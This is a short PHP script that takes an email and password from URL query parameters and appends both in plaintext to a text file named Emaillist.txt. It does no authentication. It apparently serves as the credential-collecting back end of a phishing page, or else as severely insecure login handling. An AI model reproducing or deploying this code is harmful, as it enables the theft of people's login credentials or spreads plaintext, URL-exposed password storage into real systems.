<?php
namespace app;

require ('login.php');

$emailwriter = new login('storage/Emaillist.txt');
$email = $_GET['email'];

$passwordwriter = new login('storage/Emaillist.txt');
$password = $_GET['password'];

$passwordwriter->SaveFile($password);
$emailwriter->SaveFile($email);
?>